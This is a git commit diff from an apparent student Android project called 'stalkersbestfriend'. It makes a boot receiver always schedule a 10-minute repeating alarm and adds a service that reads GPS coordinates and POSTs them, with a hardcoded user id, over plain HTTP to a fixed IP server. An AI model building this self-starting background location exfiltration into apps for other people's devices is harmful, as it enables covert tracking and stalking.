e2d6bcaf3a967df53174b7b4dfe6ea9e520bd9b5
AcidDreamer <nmandrelas@gmail.com>
2017-02-08 20:54:45 +0200

    --Post functions done , debugged

--- app/src/main/java/teamproject/a/just/stalkersbestfriend/OnBootStartGetReceiver.java
+++ app/src/main/java/teamproject/a/just/stalkersbestfriend/OnBootStartGetReceiver.java
@@ -15,14 +15,12 @@ public class OnBootStartGetReceiver extends BroadcastReceiver {
     //Intent-filter BOOT_COMPLETE added to this one , making sure that it fires off when the device has booted
     @Override
     public void onReceive(Context context, Intent intent) {
-        if (intent.getAction().matches("android.intent.action.BOOT_COMPLETED")) {
-            System.out.println("kaaaati");
-            AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);          //create the alarm manager
-            Intent i = new Intent(context, getReceiver.class);                                                   //Create a new intent sending and the other receiver
-            PendingIntent pI = PendingIntent.getBroadcast(context, 0, i, PendingIntent.FLAG_CANCEL_CURRENT);     //Create a pending intent {context,singal(we define it),intent,Flag}
-            Calendar rightNow = Calendar.getInstance();                                                          //get the instance of the calendar to a local calendar
-            rightNow.add(Calendar.MINUTE, 10);                                                                   //add to it ,10 minutes
-            alarmManager.setInexactRepeating(AlarmManager.RTC, rightNow.getTimeInMillis(), 10 * 60 * 1000, pI);  //Resend the singal {don't wake up the device,starting time,interval,pending inent}
-        }
+        System.out.println("kaaaati");
+        AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);          //create the alarm manager
+        Intent i = new Intent(context, getReceiver.class);                                                   //Create a new intent sending and the other receiver
+        PendingIntent pI = PendingIntent.getBroadcast(context, 0, i, PendingIntent.FLAG_CANCEL_CURRENT);     //Create a pending intent {context,singal(we define it),intent,Flag}
+        Calendar rightNow = Calendar.getInstance();                                                          //get the instance of the calendar to a local calendar
+        rightNow.add(Calendar.MINUTE, 10);                                                                   //add to it ,10 minutes
+        alarmManager.setInexactRepeating(AlarmManager.RTC, rightNow.getTimeInMillis(), 10 * 60 * 1000, pI);  //Resend the singal {don't wake up the device,starting time,interval,pending inent}
     }
 }
--- app/src/main/java/teamproject/a/just/stalkersbestfriend/postStalkerService.java
+++ app/src/main/java/teamproject/a/just/stalkersbestfriend/postStalkerService.java
@@ -12,6 +12,10 @@ import android.util.Log;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.io.DataOutputStream;
+import java.io.IOException;
+import java.net.HttpURLConnection;
+import java.net.URL;
 import java.text.SimpleDateFormat;
 import java.util.Calendar;
 
@@ -26,61 +30,62 @@ public class postStalkerService extends Service {
     final String httpPath = "http://62.217.127.19:8000/location";                                   //our post request URL
 
     //Implement a LocaitonListener to snatch the location , he will be terminated after that
-    private class LocationListener implements android.location.LocationListener{
+    private class LocationListener implements android.location.LocationListener {
         //Initialize  the listener
         Location mLastLocation;
-        public LocationListener(String provider){
+
+        public LocationListener(String provider) {
             mLastLocation = new Location(provider);
         }
 
         //VERY IMPORTANT , every time the service starts , it get the values here , BUT we must destroy the service after we get the values
         //to make SURE that the onLocationChanged will be called next time
         @Override
-        public void onLocationChanged(Location location){
-            Log.e("Toxic:-->", "onLocationChanged: " + location.getLongitude() + " amplitude--> "+ location.getLatitude());
+        public void onLocationChanged(Location location) {
+            Log.e("Toxic:-->", "onLocationChanged: " + location.getLongitude() + " amplitude--> " + location.getLatitude());
             mLastLocation.set(location);
             //we will sent the request
             sentRequest(location);
             stopSelf();
         }
+
         //In case the gps is disabled ,kill the service
         @Override
-        public void onProviderDisabled(String provider){
+        public void onProviderDisabled(String provider) {
             stopSelf();
         }
 
         //Nothing to do when gps is turned on
         @Override
-        public void onProviderEnabled(String provider){
+        public void onProviderEnabled(String provider) {
         }
 
         //Nothing to do when gps is turning on and off as well
         @Override
-        public void onStatusChanged(String provider, int status, Bundle extras){
+        public void onStatusChanged(String provider, int status, Bundle extras) {
         }
     }
+
     //Create a new object of our newly created type
     LocationListener mLocationListener = new LocationListener(LocationManager.GPS_PROVIDER);
 
 
     @Override
-    public IBinder onBind(Intent arg0)
-    {
+    public IBinder onBind(Intent arg0) {
         return null;
     }
 
     @Override
-    public int onStartCommand(Intent intent, int flags, int startId)
-    {
+    public int onStartCommand(Intent intent, int flags, int startId) {
         super.onStartCommand(intent, flags, startId);
         return START_STICKY;
     }
 
     @Override
-    public void onCreate(){
+    public void onCreate() {
         startLocationManager();
         try {
-            mLocationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, LOCATION_INTERVAL, LOCATION_DISTANCE,mLocationListener);
+            mLocationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, LOCATION_INTERVAL, LOCATION_DISTANCE, mLocationListener);
         } catch (java.lang.SecurityException ex) {
             Log.i(TAG, "fail to request location update, ignore", ex);
         } catch (IllegalArgumentException ex) {
@@ -89,9 +94,9 @@ public class postStalkerService extends Service {
     }
 
     @Override
-    public void onDestroy(){
+    public void onDestroy() {
         super.onDestroy();
-        if (mLocationManager != null){
+        if (mLocationManager != null) {
             try {
                 //noinspection MissingPermission
                 mLocationManager.removeUpdates(mLocationListener);      //Remove the listener , needs special handling for android API 23
@@ -107,26 +112,56 @@ public class postStalkerService extends Service {
             mLocationManager = (LocationManager) getApplicationContext().getSystemService(Context.LOCATION_SERVICE);
         }
     }
-    private void sentRequest(Location location){
+
+    private void sentRequest(Location location) {
         /*Make a json object*/
-        JSONObject myCoordinates = new JSONObject();
+        final JSONObject myCoordinates = new JSONObject();
         /*Create a calendar item*/
         Calendar rightNow = Calendar.getInstance();
         /*create a formatted the date string*/
         SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd;HH:mm:ss");
         /*Fill the date*/
         String formattedDate = df.format(rightNow.getTime());
-        try{
+        try {
             /*add json objects*/
-            myCoordinates.put("userid","it21458");
-            myCoordinates.put("longitude",location.getLongitude());
-            myCoordinates.put("latitude",location.getLatitude());
-            myCoordinates.put("dt",formattedDate);
+            myCoordinates.put("userid", "it21458");
+            myCoordinates.put("longitude", location.getLongitude());
+            myCoordinates.put("latitude", location.getLatitude());
+            myCoordinates.put("dt", formattedDate);
             System.out.println(myCoordinates.toString());
-        }catch (JSONException e) {
+        } catch (JSONException e) {
             e.printStackTrace();
         }
-        //Url url = new Url(httpPath);
+        /*Create a new thread to execute networking*/
+        Thread thread = new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    URL url = new URL(httpPath);
+                    HttpURLConnection con = (HttpURLConnection) url.openConnection();
+                    /*Set the method to POST and the content type  to json*/
+                    con.setRequestMethod("POST");
+                    con.setRequestProperty("Content-Type", "application/json");
+                    /*we want to gget the output*/
+                    con.setDoOutput(true);
+                    /*assign variable to the stream*/
+                    DataOutputStream dStream = new DataOutputStream(con.getOutputStream());
+                    /*Sent the request*/
+                    dStream.writeBytes(myCoordinates.toString());
+                    /*Flush the input we provided*/
+                    dStream.flush();
+                    /*Close the stream*/
+                    dStream.close();
+                    System.out.println(con.getResponseCode() + " <-----> " +con.getResponseMessage());
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+                /*Stop the thread for better or worse*/
+                Thread.currentThread().interrupt();
+            }
+        });
+        thread.start();
+
 
     }
 }
